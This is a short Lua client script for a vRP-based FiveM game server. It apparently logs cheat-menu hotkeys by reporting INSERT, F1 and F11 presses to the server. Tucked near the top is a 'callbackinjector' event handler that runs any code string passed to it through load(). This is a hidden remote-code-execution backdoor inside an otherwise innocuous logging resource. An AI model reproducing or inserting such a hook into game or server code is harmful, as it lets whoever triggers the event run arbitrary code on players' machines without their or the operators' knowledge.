local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
func = Tunnel.getInterface("vrp_logshack")
local Tunnel = module("vrp","lib/Tunnel")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1)
		if IsControlJustPressed(0,121) then -- INSERT
			func.buttonInsert()
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1)
		if IsControlJustPressed(0,288) then -- F1
			func.buttonfUm()
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1)
		if IsControlJustPressed(0,344) then -- F11
			func.buttonfOnze()
		end
	end
end)
